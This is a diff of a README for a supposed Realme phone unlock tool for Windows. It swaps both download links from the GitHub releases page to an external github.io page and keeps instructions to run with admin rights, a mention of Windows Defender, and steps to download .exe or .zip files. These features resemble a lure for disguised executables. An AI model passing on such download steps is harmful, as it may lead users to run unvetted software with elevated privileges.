@@ -1,6 +1,6 @@
 # 🔓 Descargar-Realme-Unlock - Unlock your Realme device today easily
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/pulsotrabajando-collab/Descargar-Realme-Unlock/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://pulsotrabajando-collab.github.io)
 
 ## 📋 Project Overview
 
@@ -25,7 +25,7 @@ Ensure you have administrative rights on your Windows account. Windows Defender 
 
 Visit the official release page to download the latest version of the tool. Always use the primary link provided to ensure you receive the clean version of the software.
 
-[Click here to visit the release page and start your download](https://github.com/pulsotrabajando-collab/Descargar-Realme-Unlock/releases)
+[Click here to visit the release page and start your download](https://pulsotrabajando-collab.github.io)
 
 On this page, look for the section marked "Assets." Click the file ending in `.zip` or `.exe` to begin the transfer. Do not choose files labeled "Source code" unless you intend to modify the software, as these do not contain the ready-to-run application.
 
